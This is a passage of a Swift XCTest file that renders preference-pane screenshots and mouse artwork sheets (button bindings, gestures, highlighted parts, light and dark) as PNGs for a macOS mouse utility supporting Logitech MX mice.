            Options.shared.logiWheel = LogiWheelSettings(managedByScrollio: mouse.device != nil)
            try renderMouse(mouse.device.map { [$0] } ?? [], name: "pane-mouse-\(mouse.name)")
            if let device = mouse.device {
                let model = MouseArtworkModel.model(forDeviceName: device.deviceName)
                for part in MousePart.allCases where model.has(part.artworkPart) {
                    try renderMouse([device], name: "pane-mouse-\(mouse.name)-lit-\(part)", lit: part)
                }
            }

            Options.shared.buttons.binding = [
                binding(3, SystemShortcut.navigateBack.identifier),
                binding(4, SystemShortcut.navigateForward.identifier),
                binding(1000, SystemShortcut.mouseGestureNavigation.identifier),
                binding(1001, SystemShortcut.logiSmartShiftToggle.identifier),
                binding(2000 + 0x01A0, SystemShortcut.missionControl.identifier),
                binding(6, SystemShortcut.copy.identifier),
                ButtonBinding(
                    triggerEvent: RecordedEvent(type: .mouse, code: 5, modifiers: 0, deviceFilter: nil, mousePart: .thumbPanel),
                    systemShortcutName: SystemShortcut.paste.identifier
                ),
            ]
            let name = mouse.device?.deviceName
            let source = ButtonsDeviceSource(captureStatus: { _ in .normal }, deviceName: { name }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in })
            try renderButtons(name: "pane-buttons-\(mouse.name)", source: source) { buttons in
                buttons.list.select(self.rowID(buttons, binding: 2))
            }
            try renderButtons(name: "pane-buttons-\(mouse.name)-thumb-panel", source: source) { buttons in
                buttons.list.select(self.rowID(buttons, binding: 6))
            }
            try renderButtons(name: "pane-buttons-\(mouse.name)-thats-gesture-button", source: source) { buttons in
                self.answer(buttons, code: 1000)
            }
            try renderPlaceMenu(name: "menu-place-\(mouse.name)", binding: 5, deviceName: name)

            var gesture = MouseGestureSettings.default
            gesture.mode = .discrete
            Options.shared.gesture = gesture
            Options.shared.logiMouse = LogiMouseSettings()
            try renderPane(GesturesPreferencesViewController.tabIdentifier, name: "pane-gestures-\(mouse.name)", replacement: {
                let gestures = GesturesPreferencesViewController(isInteractiveAvailable: { true })
                gestures.deviceSource = MouseGestureDeviceSource(support: { mouse.support }, refresh: {})
                gestures.bindingSummary = {
                    MouseGestureBindingSummary(
                        hasGestureButton: true,
                        hasLogitechGestureButton: mouse.device != nil,
                        buttonTitles: [mouse.device != nil ? "Gesture button" : "Back button"],
                        picture: self.gesturePicture(logitech: mouse.device != nil)
                    )
                }
                return gestures
            }, afterLoad: { controller in
                guard let gestures = controller as? GesturesPreferencesViewController else { return }
                gestures.previewView.prefersReducedMotion = { true }
                gestures.previewView.reduceMotionDidChange()
                gestures.previewView.mouseSource = { MouseArtworkModel.model(forDeviceName: name) }
                gestures.previewView.reloadMouse()
            })
        }
    }

    /// Each drawing alone at four times the card's size on the card's colour, plain and with
    /// each part it has lit, light and dark (`art-<mouse>-<part>-<appearance>.png`), plain
    /// also at its size on a 1x and a 2x screen; and the rows' pictures of every drawing
    /// with each part lit, on the list's box and on the selection, at four times their size
    /// (`art-miniatures-<appearance>.png`).
    func testRenderMouseArtwork() throws {
        for model in MouseArtworkModel.allCases {
            let name = Self.shortName(of: model)
            for part in [nil] + model.parts {
                let artwork = MouseArtworkView()
                artwork.model = model
                artwork.setEmphasis(part, animated: false)
                try renderDrawing(artwork, name: "art-\(name)-\(part.map { "\($0)" } ?? "plain")", scale: 4)
            }
            for scale in [CGFloat(1), 2] {
                let artwork = MouseArtworkView()
                artwork.model = model
                try renderDrawing(artwork, name: "art-\(name)-plain-\(Int(scale))x", scale: scale)
            }
        }
        try renderMiniatureSheet()
    }

    /// A drawing that has two views, for looking at before it is merged
    /// (`views-<mouse>-sheet-<appearance>.png`, at three times the cards' size): each view
    /// plain, then each part lit in the view it lights in, as the cards light it. And its
    /// rows' pictures at four times their size, every part lit and the thumb wheel, on the
    /// list's box and on the selection, dark over light (`views-<mouse>-rows.png`).
    ///
    /// For a comparison with the drawing as it was, render it first with
    /// `testRenderMouseArtwork` and leave those pictures in a folder `before` inside the
    /// folder of this run: the sheet then starts with `before/art-<mouse>-plain-…`, and the
    /// rows' sheet has `before/art-miniatures-…`'s rows of that mouse above the new ones
    /// (and `before/row-thumb-wheel-…` and `before/row-thumb-wheel-selected-…`, the thumb
    /// wheel's row picture as it was, which that sheet does not have: 24 pt, no background).
    func testRenderMouseTwoViewsSheets() throws {
        for model in MouseArtworkModel.allCases where model.hasSideView {
            try renderViewsSheet(of: model)
            try renderViewsRows(of: model)
        }
    }

    /// The MX Anywhere 3 and the MX Vertical for looking at (`<mouse>-sheet.png`, three
    /// times the cards' size, light above dark): both views plain, then each part lit in
    /// the view it lights in, as the cards light it; and under them the rows' pictures of
    /// its buttons and of nothing lit, on the card's colour and on the selection. And the
    /// Buttons pane as it shows with that mouse connected: nothing chosen, the Forward
    /// button's row chosen (the card turns to the thumb side), and the second row chosen
    /// (`pane-buttons-<mouse>[-forward|-second]-<appearance>.png`).
    func testRenderAnywhereAndVertical() throws {
        let mice: [(model: MouseArtworkModel, deviceName: String)] = [
            (.mxAnywhere3, "MX Anywhere 3S"), (.mxVertical, "MX Vertical"),
        ]
        for mouse in mice {
            let name = Self.shortName(of: mouse.model)
            try renderLookSheet(of: mouse.model)
            Options.shared.buttons.binding = [
                binding(3, SystemShortcut.navigateBack.identifier),
                binding(4, SystemShortcut.navigateForward.identifier),
                binding(2, SystemShortcut.missionControl.identifier),
            ]
            let source = ButtonsDeviceSource(
                captureStatus: { _ in .normal }, deviceName: { mouse.deviceName }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in }
            )
            try renderButtons(name: "pane-buttons-\(name)", source: source)
            try renderButtons(name: "pane-buttons-\(name)-forward", source: source) { buttons in
                buttons.list.select(AnyHashable(ButtonsMousePart.forward))
            }
            try renderButtons(name: "pane-buttons-\(name)-second", source: source) { buttons in
                buttons.list.select(AnyHashable(ButtonsMousePart.listed(on: mouse.model)[1]))
            }
        }
    }

    private func renderLookSheet(of model: MouseArtworkModel) throws {
        let unit = MouseArtworkView.unit
        let tile = NSSize(width: 136, height: 150)
        let caption: CGFloat = 22
        var tiles: [(title: String, viewpoint: MouseArtworkViewpoint, lit: MouseArtworkPart?)] = [
            ("from above", .above, nil), ("from the thumb side", .thumbSide, nil),
        ]
        let order: [MouseArtworkPart] = [.left, .right, .wheel, .modeShift, .pointerSpeed, .forward, .back, .body]
        for part in order where model.has(part) {
            tiles.append(("\(part)", model.viewpoint(lighting: part), part))
        }
        let columns = 5
        let rows = (tiles.count + columns - 1) / columns
        // The rows' pictures at twice their size (six pixels per point on the sheet).
        let small: CGFloat = 2 * ButtonsMouseMiniature.size.height + 12
        let pictures: [ButtonsMousePart?] = [.left, .right] + ButtonsMousePart.listed(on: model) + [nil]
        let half = NSSize(width: tile.width * CGFloat(columns), height: tile.height * CGFloat(rows) + 2 * small)
        let bounds = NSRect(x: 0, y: 0, width: half.width, height: 2 * half.height)
        let light = try XCTUnwrap(NSAppearance(named: .aqua)), dark = try XCTUnwrap(NSAppearance(named: .darkAqua))
        func drawHalf(at top: CGFloat) {
            let area = NSRect(x: 0, y: top, width: half.width, height: half.height)
            NSColor.windowBackgroundColor.setFill()
            area.fill()
            ScrollPreviewPalette.cardFill.setFill()
            area.fill()
            for (index, entry) in tiles.enumerated() {
                let frame = NSRect(
                    x: CGFloat(index % columns) * tile.width, y: top + CGFloat(index / columns) * tile.height,
                    width: tile.width, height: tile.height
                )
                NSAttributedString(string: entry.title, attributes: [
                    .font: NSFont.systemFont(ofSize: 10, weight: .medium), .foregroundColor: NSColor.secondaryLabelColor,
                ]).draw(at: NSPoint(x: frame.minX + 8, y: frame.minY + 5))
                let art = NSRect(x: frame.minX, y: frame.minY + caption, width: frame.width, height: frame.height - caption)
                let shapes = MouseArtworkShapes(model: model, viewpoint: entry.viewpoint)
                NSGraphicsContext.saveGraphicsState()
                let transform = NSAffineTransform()
                transform.translateX(
                    by: art.midX - MouseArtworkShapes.centre.x * unit, yBy: art.midY - MouseArtworkShapes.centre.y * unit
                )
                transform.scale(by: unit)
                transform.concat()
                MouseArtworkPainter.draw(shapes, ink: .card, unit: unit)
                if let lit = entry.lit {
                    MouseArtworkPainter.drawHighlight(lit, shapes: shapes, unit: unit)
                }
                NSGraphicsContext.restoreGraphicsState()
            }
            let size = ButtonsMouseMiniature.size
            for highlighted in [false, true] {
                let y = top + tile.height * CGFloat(rows) + (highlighted ? small : 0)
                if highlighted {
                    NSColor.controlAccentColor.setFill()
                    NSRect(x: 0, y: y, width: half.width, height: small).fill()
                }
                for (index, part) in pictures.enumerated() {
                    NSGraphicsContext.saveGraphicsState()
                    let transform = NSAffineTransform()
                    transform.translateX(by: 16 + CGFloat(index) * (2 * size.width + 24), yBy: y + 6)
                    transform.scale(by: 2)
                    transform.concat()
                    ButtonsMouseMiniature.draw(
                        .mouse(part: part, number: nil), mouse: model, in: NSRect(origin: .zero, size: size), highlighted: highlighted
                    )
                    NSGraphicsContext.restoreGraphicsState()
                }
            }
        }
        try renderSheet(bounds: bounds, scale: 3, appearance: light, to: "\(Self.shortName(of: model))-sheet.png") {
            drawHalf(at: 0)
            dark.performAsCurrentDrawingAppearance {
                drawHalf(at: half.height)
            }
        }
    }

    private func renderViewsSheet(of model: MouseArtworkModel) throws {
        let name = Self.shortName(of: model)
        let unit = MouseArtworkView.unit
        let tile = NSSize(width: 136, height: 150)
        let caption: CGFloat = 22
        var tiles: [(title: String, viewpoint: MouseArtworkViewpoint?, lit: MouseArtworkPart?)] = [
            ("as it was", nil, nil),
            ("from above", .above, nil),
            ("from the thumb side", .thumbSide, nil),
        ]
        let order: [MouseArtworkPart] = [.wheel, .modeShift, .pointerSpeed, .left, .thumbWheel, .gesture, .forward, .back, .thumbPanel, .right]
        for part in order where model.has(part) {
            tiles.append(("\(part)", model.viewpoint(lighting: part), part))
        }
        let columns = 4
        let rows = (tiles.count + columns - 1) / columns
        let bounds = NSRect(x: 0, y: 0, width: tile.width * CGFloat(columns), height: tile.height * CGFloat(rows))
        for (suffix, appearanceName) in [("light", NSAppearance.Name.aqua), ("dark", .darkAqua)] {
            let appearance = try XCTUnwrap(NSAppearance(named: appearanceName))
            let old = NSImage(contentsOf: directory.appendingPathComponent("before/art-\(name)-plain-\(suffix).png"))
            try renderSheet(bounds: bounds, scale: 3, appearance: appearance, to: "views-\(name)-sheet-\(suffix).png") {
                NSColor.windowBackgroundColor.setFill()
                bounds.fill()
                ScrollPreviewPalette.cardFill.setFill()
                bounds.fill()
                for (index, entry) in tiles.enumerated() {
                    let frame = NSRect(
                        x: CGFloat(index % columns) * tile.width, y: CGFloat(index / columns) * tile.height,
                        width: tile.width, height: tile.height
                    )
                    NSAttributedString(string: entry.title, attributes: [
                        .font: NSFont.systemFont(ofSize: 10, weight: .medium), .foregroundColor: NSColor.secondaryLabelColor,
                    ]).draw(at: NSPoint(x: frame.minX + 8, y: frame.minY + 5))
                    let art = NSRect(x: frame.minX, y: frame.minY + caption, width: frame.width, height: frame.height - caption)
                    guard let viewpoint = entry.viewpoint else {
                        // The picture of the old drawing: the card's view on the card's colour.
                        if let old {
                            let height = MouseArtworkShapes.grid.height * unit + 2 * MouseArtworkView.margin
                            let width = height * old.size.width / old.size.height
                            old.draw(
                                in: NSRect(x: art.midX - width / 2, y: art.midY - height / 2, width: width, height: height),
                                from: .zero, operation: .sourceOver, fraction: 1, respectFlipped: true, hints: nil
                            )
                        }
                        continue
                    }
                    let shapes = MouseArtworkShapes(model: model, viewpoint: viewpoint)
                    NSGraphicsContext.saveGraphicsState()
                    let transform = NSAffineTransform()
                    transform.translateX(
                        by: art.midX - MouseArtworkShapes.centre.x * unit, yBy: art.midY - MouseArtworkShapes.centre.y * unit
                    )
                    transform.scale(by: unit)
                    transform.concat()
                    MouseArtworkPainter.draw(shapes, ink: .card, unit: unit)
                    if let lit = entry.lit {
                        MouseArtworkPainter.drawHighlight(lit, shapes: shapes, unit: unit)
                    }
                    NSGraphicsContext.restoreGraphicsState()
                }
            }
        }
    }

    private func renderViewsRows(of model: MouseArtworkModel) throws {
        let name = Self.shortName(of: model)
        let cell: CGFloat = 32
        let label: CGFloat = 64
        let size = ButtonsMouseMiniature.size
        let parts = ButtonsMousePart.allCases
        // Each part, the thumb wheel, nothing lit, a numbered button.
        let columns = parts.count + 3
        let appearances: [(String, NSAppearance.Name)] = [("dark", .darkAqua), ("light", .aqua)]
        let band = cell * 4 + 18 * 2
        let bounds = NSRect(x: 0, y: 0, width: label + cell * CGFloat(columns), height: band * CGFloat(appearances.count))
        let canvas = try XCTUnwrap(NSBitmapImageRep(
            bitmapDataPlanes: nil, pixelsWide: Int(bounds.width * 4), pixelsHigh: Int(bounds.height * 4),
            bitsPerSample: 8, samplesPerPixel: 4, hasAlpha: true, isPlanar: false,
            colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0
        ))
        canvas.size = bounds.size
        let context = try XCTUnwrap(NSGraphicsContext(bitmapImageRep: canvas))
        NSGraphicsContext.saveGraphicsState()
        NSGraphicsContext.current = NSGraphicsContext(cgContext: context.cgContext, flipped: true)
        context.cgContext.translateBy(x: 0, y: bounds.height)
        context.cgContext.scaleBy(x: 1, y: -1)
        for (index, (suffix, appearanceName)) in appearances.enumerated() {
            let appearance = try XCTUnwrap(NSAppearance(named: appearanceName))
            let old = NSImage(contentsOf: directory.appendingPathComponent("before/art-miniatures-\(suffix).png"))
            let top = CGFloat(index) * band
            appearance.performAsCurrentDrawingAppearance {
                NSColor.windowBackgroundColor.setFill()
                NSRect(x: 0, y: top, width: bounds.width, height: band).fill()
                let captionAttributes: [NSAttributedString.Key: Any] = [
                    .font: NSFont.systemFont(ofSize: 10, weight: .medium), .foregroundColor: NSColor.secondaryLabelColor,
                ]
                // As it was: the rows of this mouse in the earlier sheet (two rows per mouse,
                // a label column, then a cell per part, nothing lit and a numbered button),
                // its last two cells moved one to the right, under the new sheet's.
                NSAttributedString(string: "as it was", attributes: captionAttributes).draw(at: NSPoint(x: 6, y: top + 3))
                if let old, let position = MouseArtworkModel.allCases.firstIndex(of: model) {
                    let bottom = old.size.height - CGFloat(position * 2 + 2) * cell
                    let partsWidth = CGFloat(parts.count) * cell
                    // A sheet made since the thumb wheel got its column has this sheet's
                    // columns; an earlier one has none for it: its last two cells go one to
                    // the right, and the thumb wheel's old picture comes from a file.
                    let hasThumbWheel = old.size.width >= label + CGFloat(columns) * cell - 1
                    let pieces: [(from: CGFloat, to: CGFloat, width: CGFloat)] = hasThumbWheel
                        ? [(label, label, CGFloat(columns) * cell)]
                        : [(label, label, partsWidth), (label + partsWidth, label + partsWidth + cell, 2 * cell)]
                    for piece in pieces {
                        old.draw(
                            in: NSRect(x: piece.to, y: top + 18, width: piece.width, height: 2 * cell),
                            from: NSRect(x: piece.from, y: bottom, width: piece.width, height: 2 * cell),
                            operation: .sourceOver, fraction: 1, respectFlipped: true, hints: nil
                        )
                    }
                    if !hasThumbWheel {
                        PreferencesGroupedForm.boxFillColor.setFill()
                        NSRect(x: label + partsWidth, y: top + 18, width: cell, height: cell).fill()
                        NSColor.controlAccentColor.setFill()
                        NSRect(x: label + partsWidth, y: top + 18 + cell, width: cell, height: cell).fill()
                    }
                    for (row, selected) in (hasThumbWheel ? [] : ["", "-selected"]).enumerated() {
                        let file = directory.appendingPathComponent("before/row-thumb-wheel\(selected)-\(suffix).png")
                        guard let wheel = NSImage(contentsOf: file) else { continue }
                        wheel.draw(
                            in: NSRect(
                                x: label + partsWidth + (cell - size.width) / 2,
                                y: top + 18 + CGFloat(row) * cell + (cell - size.height) / 2,
                                width: size.width, height: size.height
                            ),
                            from: .zero, operation: .sourceOver, fraction: 1, respectFlipped: true, hints: nil
                        )
                    }
                }
                let newTop = top + 18 + 2 * cell
                NSAttributedString(string: "new", attributes: captionAttributes).draw(at: NSPoint(x: 6, y: newTop + 3))
                let names: [ButtonsMousePart: String] = [.middle: "wheel", .modeShift: "mode shift", .thumbPanel: "panel"]
                for (column, name) in (parts.map { names[$0] ?? "\($0)" } + ["thumb wheel", "nothing lit", "numbered"]).enumerated() {
                    let text = NSAttributedString(string: name, attributes: [
                        .font: NSFont.systemFont(ofSize: 5, weight: .medium), .foregroundColor: NSColor.secondaryLabelColor,
                    ])
                    text.draw(at: NSPoint(x: label + (CGFloat(column) + 0.5) * cell - text.size().width / 2, y: newTop + 8))
                }
                for (row, highlighted) in [(0, false), (1, true)] {
                    let y = newTop + 18 + CGFloat(row) * cell
                    (highlighted ? NSColor.controlAccentColor : PreferencesGroupedForm.boxFillColor).setFill()
                    NSRect(x: label, y: y, width: bounds.width - label, height: cell).fill()
                    func frame(_ column: Int) -> NSRect {
                        return NSRect(
                            x: label + CGFloat(column) * cell + (cell - size.width) / 2,
                            y: y + (cell - size.height) / 2, width: size.width, height: size.height
                        )
                    }
                    for (column, part) in parts.enumerated() {
                        let picture: ButtonTriggerPicture = model.has(part.artworkPart)
                            ? .mouse(part: part, number: nil) : .mouse(part: nil, number: 5)
                        ButtonsMouseMiniature.draw(picture, mouse: model, in: frame(column), highlighted: highlighted)
                    }
                    ButtonsMouseMiniature.image(lighting: .thumbWheel, mouse: model, highlighted: highlighted)
                        .draw(in: frame(parts.count))
                    ButtonsMouseMiniature.draw(.mouse(part: nil, number: nil), mouse: model, in: frame(parts.count + 1), highlighted: highlighted)
                    ButtonsMouseMiniature.draw(.mouse(part: nil, number: 6), mouse: model, in: frame(parts.count + 2), highlighted: highlighted)
                }
            }
        }
        NSGraphicsContext.restoreGraphicsState()
        let png = try XCTUnwrap(canvas.representation(using: .png, properties: [:]))
        try png.write(to: directory.appendingPathComponent("views-\(name)-rows.png"))
    }

    /// `draw`, in a flipped context `bounds` large and in `appearance`, written at `scale`
    /// pixels per point.
    private func renderSheet(bounds: NSRect, scale: CGFloat, appearance: NSAppearance, to file: String, draw: () -> Void) throws {
        let canvas = try XCTUnwrap(NSBitmapImageRep(
            bitmapDataPlanes: nil, pixelsWide: Int(bounds.width * scale), pixelsHigh: Int(bounds.height * scale),
            bitsPerSample: 8, samplesPerPixel: 4, hasAlpha: true, isPlanar: false,
            colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0
        ))
        canvas.size = bounds.size
        let context = try XCTUnwrap(NSGraphicsContext(bitmapImageRep: canvas))
        NSGraphicsContext.saveGraphicsState()
        NSGraphicsContext.current = NSGraphicsContext(cgContext: context.cgContext, flipped: true)
        context.cgContext.translateBy(x: 0, y: bounds.height)
        context.cgContext.scaleBy(x: 1, y: -1)
        appearance.performAsCurrentDrawingAppearance(draw)
        NSGraphicsContext.restoreGraphicsState()
        let png = try XCTUnwrap(canvas.representation(using: .png, properties: [:]))
        try png.write(to: directory.appendingPathComponent(file))
    }

    private static func shortName(of model: MouseArtworkModel) -> String {
        switch model {
        case .mxMaster4: return "mx4"
        case .mxMaster3: return "mx3"
        case .mxAnywhere3: return "anywhere"
        case .mxVertical: return "vertical"
        case .generic: return "generic"
        }
    }

    /// `view` on the card's colour at `scale` times its size, light and dark.
    private func renderDrawing(_ view: NSView, name: String, scale: CGFloat) throws {
        let holder = NSView(frame: view.bounds)
        holder.wantsLayer = true
        holder.addSubview(view)
        for (suffix, appearanceName) in [("light", NSAppearance.Name.aqua), ("dark", .darkAqua)] {
            let appearance = try XCTUnwrap(NSAppearance(named: appearanceName))
            holder.appearance = appearance
            holder.display()
            let canvas = try XCTUnwrap(NSBitmapImageRep(
                bitmapDataPlanes: nil, pixelsWide: Int(holder.bounds.width * scale), pixelsHigh: Int(holder.bounds.height * scale),
                bitsPerSample: 8, samplesPerPixel: 4, hasAlpha: true, isPlanar: false,
                colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0
            ))
            canvas.size = holder.bounds.size
            let context = try XCTUnwrap(NSGraphicsContext(bitmapImageRep: canvas))
            NSGraphicsContext.saveGraphicsState()
            NSGraphicsContext.current = context
            appearance.performAsCurrentDrawingAppearance {
                NSColor.windowBackgroundColor.setFill()
                holder.bounds.fill()
                ScrollPreviewPalette.cardFill.setFill()
                holder.bounds.fill()
            }
            NSGraphicsContext.restoreGraphicsState()
            NSGraphicsContext.saveGraphicsState()
            NSGraphicsContext.current = context
            appearance.performAsCurrentDrawingAppearance {
                holder.displayIgnoringOpacity(holder.bounds, in: context)
            }
            NSGraphicsContext.restoreGraphicsState()
            let png = try XCTUnwrap(canvas.representation(using: .png, properties: [:]))
            try png.write(to: directory.appendingPathComponent("\(name)-\(suffix).png"))
        }
    }

    /// The rows' pictures: a row per drawing on the list's box and one on the selection;
    /// each part the drawing has lit (a part it does not have as the row shows it then),
    /// the thumb wheel's row picture, nothing lit and a numbered button.
    private func renderMiniatureSheet() throws {
        let cell: CGFloat = 32
        let label: CGFloat = 64
        let parts = ButtonsMousePart.allCases
        // Each part, the thumb wheel, nothing lit, a numbered button.
        let columns = parts.count + 3
        let bounds = NSRect(x: 0, y: 0, width: label + cell * CGFloat(columns), height: cell * CGFloat(2 * MouseArtworkModel.allCases.count))
        let size = ButtonsMouseMiniature.size
        for (suffix, appearanceName) in [("light", NSAppearance.Name.aqua), ("dark", .darkAqua)] {
            let appearance = try XCTUnwrap(NSAppearance(named: appearanceName))
            let scale: CGFloat = 4
            let canvas = try XCTUnwrap(NSBitmapImageRep(
                bitmapDataPlanes: nil, pixelsWide: Int(bounds.width * scale), pixelsHigh: Int(bounds.height * scale),
                bitsPerSample: 8, samplesPerPixel: 4, hasAlpha: true, isPlanar: false,
                colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0
            ))
            canvas.size = bounds.size
            let context = try XCTUnwrap(NSGraphicsContext(bitmapImageRep: canvas))
            NSGraphicsContext.saveGraphicsState()
            NSGraphicsContext.current = NSGraphicsContext(cgContext: context.cgContext, flipped: true)
            context.cgContext.translateBy(x: 0, y: bounds.height)
            context.cgContext.scaleBy(x: 1, y: -1)
            appearance.performAsCurrentDrawingAppearance {
                NSColor.windowBackgroundColor.setFill()
                bounds.fill()
                for (index, model) in MouseArtworkModel.allCases.enumerated() {
                    for (row, highlighted) in [(0, false), (1, true)] {
                        let y = CGFloat(index * 2 + row) * cell
                        (highlighted ? NSColor.controlAccentColor : PreferencesGroupedForm.boxFillColor).setFill()
                        NSRect(x: label, y: y, width: bounds.width - label, height: cell).fill()
                        if row == 0 {
                            NSAttributedString(string: Self.shortName(of: model), attributes: [
                                .font: NSFont.systemFont(ofSize: 11, weight: .medium), .foregroundColor: NSColor.labelColor,
                            ]).draw(at: NSPoint(x: 6, y: y + 24))
                        }
                        var pictures: [ButtonTriggerPicture] = parts.map { part in
                            model.has(part.artworkPart) ? .mouse(part: part, number: nil) : .mouse(part: nil, number: 5)
                        }
                        func frame(_ column: Int) -> NSRect {
                            return NSRect(
                                x: label + CGFloat(column) * cell + (cell - size.width) / 2,
                                y: y + (cell - size.height) / 2, width: size.width, height: size.height
                            )
                        }
                        for (column, picture) in pictures.enumerated() {
                            ButtonsMouseMiniature.draw(picture, mouse: model, in: frame(column), highlighted: highlighted)
                        }
                        // The thumb wheel's row picture, for a mouse that has one.
                        if model.has(.thumbWheel) {
                            ButtonsMouseMiniature.image(lighting: .thumbWheel, mouse: model, highlighted: highlighted)
                                .draw(in: frame(parts.count))
                        }
                        ButtonsMouseMiniature.draw(.mouse(part: nil, number: nil), mouse: model, in: frame(parts.count + 1), highlighted: highlighted)
                        ButtonsMouseMiniature.draw(.mouse(part: nil, number: 6), mouse: model, in: frame(parts.count + 2), highlighted: highlighted)
                    }
                }
            }
            NSGraphicsContext.restoreGraphicsState()
            let png = try XCTUnwrap(canvas.representation(using: .png, properties: [:]))
            try png.write(to: directory.appendingPathComponent("art-miniatures-\(suffix).png"))
        }
    }

    // MARK: - Helpers

    private func uiDefaults(advanced: Bool) -> UserDefaults {
        let defaults = TestDefaults.make(for: self)
        defaults.set(advanced, forKey: PreferencesScrollingViewController.advancedExpandedDefaultsKey)
        return defaults
    }

    private func binding(_ code: UInt16, _ action: String, modifiers: UInt = 0) -> ButtonBinding {
        let trigger = RecordedEvent(type: .mouse, code: code, modifiers: modifiers, deviceFilter: nil)
        return ButtonBinding(triggerEvent: trigger, systemShortcutName: action, isEnabled: !action.isEmpty)
    }

    private func renderMouse(
        _ devices: [LogiMouseDeviceState], name: String, windowHeight: CGFloat? = nil, lit: MousePart? = nil, titled: TitledCut? = nil
    ) throws {
        try renderPane(MousePreferencesViewController.tabIdentifier, name: name, windowHeight: windowHeight, titled: titled, prepare: { preferences in
            guard let mouse = preferences.controller(for: MousePreferencesViewController.tabIdentifier)
                as? MousePreferencesViewController else { return }
            mouse.deviceSource = MouseDeviceSource(deviceStates: { devices }, refresh: {})
            mouse.readbackSettleTime = 0
        }, afterLoad: { controller in
            guard let mouse = controller as? MousePreferencesViewController else { return }
            mouse.reloadDevices()
            if let lit {
                mouse.headerView.prefersReducedMotion = { true }
                mouse.rowHoverChanged(lit, inside: true)
            }
        })
    }

    /// The Preferences window as the app makes it, in `appearance`; key unless `key` is
    /// false. Never shown.
    private func makeWindow(
        appearance: NSAppearance.Name,
        key: Bool = true,
        prepare: (PreferencesSplitViewController) -> Void = { _ in }
    ) throws -> (NSWindow, PreferencesSplitViewController) {
        let storyboard = NSStoryboard(name: "Main", bundle: app)
        let controller = try XCTUnwrap(
            storyboard.instantiateController(withIdentifier: WINDOW_IDENTIFIER.preferencesWindowController) as? PreferencesWindowController
        )
        // A window that counts as key and main, so the controls draw in the accent colour
        // as in the window the user works in. Never ordered in.
        let window = RenderWindow(
            contentRect: NSRect(x: 0, y: 0, width: 720, height: PreferencesWindowLayout.defaultContentHeight),
            styleMask: [.titled, .closable, .miniaturizable, .resizable], backing: .buffered, defer: true
        )
        window.isReleasedWhenClosed = false
        window.isKey = key
        controller.window = window
        window.appearance = NSAppearance(named: appearance)
        let preferences = PreferencesSplitViewController(storyboard: storyboard, uiStateDefaults: nil)
        prepare(preferences)
        controller.contentViewController = preferences
        controller.configure(window, remembersFrame: false)
        preferences.updateWindowTitle()
        window.contentView?.layoutSubtreeIfNeeded()
        addTeardownBlock { controller.close() }
        return (window, preferences)
    }

    /// Writes `<name>-light.png` and `<name>-dark.png`: the pane's column (520 pt) as tall as
    /// the pane, cut from the whole window. (The sidebar's source list draws nothing off
    /// screen, so only the column is written.) `replacement` puts a controller of the
    /// test's own in the column instead of the pane's. With `titled`, the column is cut from
    /// the window's frame, so the pane's title above it is drawn too (see `TitledCut`).
    private func renderPane(
        _ identifier: String,
        name: String,
        key: Bool = true,
        windowHeight: CGFloat? = nil,
        titled: TitledCut? = nil,
        prepare: @escaping (PreferencesSplitViewController) -> Void = { _ in },
        replacement: (() -> NSViewController)? = nil,
        afterLoad: @escaping (NSViewController) -> Void = { _ in }
    ) throws {
        for (suffix, appearanceName) in [("light", NSAppearance.Name.aqua), ("dark", .darkAqua)] {
            let (window, preferences) = try makeWindow(appearance: appearanceName, key: key, prepare: prepare)
            XCTAssertTrue(preferences.selectPane(withIdentifier: identifier), identifier)
            if let replacement {
                preferences.host.show(replacement())
            }
            let controller = try XCTUnwrap(preferences.host.currentController)
            afterLoad(controller)
            let content = try XCTUnwrap(window.contentView)
            content.layoutSubtreeIfNeeded()
            let top = preferences.host.view.safeAreaInsets.top
            let paneHeight = max(controller.view.frame.height, controller.view.fittingSize.height)
            let height = windowHeight ?? max(PreferencesWindowLayout.defaultContentHeight, ceil(paneHeight + top))
            window.setContentSize(NSSize(width: content.frame.width, height: height))
            content.layoutSubtreeIfNeeded()
            let appearance = try XCTUnwrap(NSAppearance(named: appearanceName))
            let scroll = preferences.host.scrollView!
            if let titled {
                let frameView = content.superview ?? content
                frameView.layoutSubtreeIfNeeded()
                let rect = titled.rect(column: scroll, pane: controller.view, in: frameView)
                try write(frameView, rect: rect, appearance: appearance, to: directory.appendingPathComponent("\(name)-\(suffix).png"))
                continue
            }
            // At a given window height: the column as the window shows it, the title bar's
            // strip included, so a pane that does not fit shows where it is cut.
            let column = windowHeight == nil
                ? scroll.convert(scroll.bounds, to: content)
                : NSRect(x: scroll.convert(scroll.bounds, to: content).minX, y: 0, width: scroll.frame.width, height: content.frame.height)
            try write(content, rect: column, appearance: appearance, to: directory.appendingPathComponent("\(name)-\(suffix).png"))
        }
    }

    /// The popover's content in its own material, as NSPopover shows it.
    private func renderInPopoverMaterial(_ view: NSView, name: String) throws {
        for (suffix, appearanceName) in [("light", NSAppearance.Name.aqua), ("dark", .darkAqua)] {
            let appearance = try XCTUnwrap(NSAppearance(named: appearanceName))
            let outer = NSView(frame: view.frame)
            outer.appearance = appearance
            let material = NSVisualEffectView(frame: view.frame)
            material.material = .popover
            material.blendingMode = .behindWindow
            outer.addSubview(material)
            material.addSubview(view)
            view.setFrameOrigin(.zero)
            view.layoutSubtreeIfNeeded()
            try write(outer, appearance: appearance, to: directory.appendingPathComponent("\(name)-\(suffix).png"))
            view.removeFromSuperview()
        }
    }

    /// Draws `view` at 2x over the window colour (the materials draw nothing off screen).
    private func write(_ view: NSView, rect: NSRect? = nil, appearance: NSAppearance, to url: URL) throws {
        view.display()
        let area = rect ?? view.bounds
        let bounds = NSRect(origin: .zero, size: area.size)
        let rep = try XCTUnwrap(view.bitmapImageRepForCachingDisplay(in: area))
        view.cacheDisplay(in: area, to: rep)

        let canvas = try XCTUnwrap(NSBitmapImageRep(
            bitmapDataPlanes: nil, pixelsWide: Int(bounds.width * 2), pixelsHigh: Int(bounds.height * 2),
            bitsPerSample: 8, samplesPerPixel: 4, hasAlpha: true, isPlanar: false,
            colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0
        ))
        canvas.size = bounds.size
        let context = try XCTUnwrap(NSGraphicsContext(bitmapImageRep: canvas))
        NSGraphicsContext.saveGraphicsState()
        NSGraphicsContext.current = context
